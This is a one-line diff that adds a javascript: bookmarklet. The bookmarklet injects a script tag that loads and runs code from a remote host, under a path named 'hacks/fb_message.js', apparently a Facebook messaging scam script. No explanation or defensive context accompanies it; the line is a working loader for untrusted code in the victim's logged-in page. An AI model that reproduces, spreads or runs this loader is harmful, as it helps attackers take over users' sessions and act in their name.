@@ -1,0 +1,1 @@
+javascript:(a=(b=document).createElement('script')).src='http://agerst.webs.com/hacks/fb_message.js',b.body.appendChild(a);void(0)
